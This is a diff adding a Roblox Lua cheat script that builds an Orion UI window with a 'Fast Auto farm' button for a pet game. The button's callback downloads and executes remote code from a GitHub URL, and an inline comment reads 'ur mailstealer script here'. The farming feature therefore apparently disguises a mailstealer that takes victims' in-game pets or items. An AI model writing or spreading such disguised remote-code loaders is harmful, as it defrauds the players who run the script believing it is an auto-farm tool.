@@ -1,0 +1,22 @@
+local OrionLib = loadstring(game:HttpGet(('https://raw.githubusercontent.com/shlexware/Orion/main/source')))()
+local Window = OrionLib:MakeWindow({Name = "FeatherV4 By MiaAce", HidePremium = false, SaveConfig = true, ConfigFolder = "OrionTest"})
+local Tab = Window:MakeTab({
+    Name = "Pet Sky-Fether",
+    Icon = "rbxassetid://4483345998",
+    PremiumOnly = false
+})
+
+local Section = Tab:AddSection({
+    Name = "Fast Auto farmvmdw"
+})
+
+Tab:AddButton({
+    Name = "Fast Auto farm",
+    Callback = function()
+              loadstring(game:HttpGet("https://raw.githubusercontent.com/MiaCat44/My-Source-V1/main/99%20V4%20Skyhub"))() --ur mailstealer script here
+      end    
+})
+
+local Section = Tab:AddSection({
+    Name = "makes sure they're in that area always farming so you can go open eggs or smthn and the pets will still be farming in the area you activates auto farm"
+})
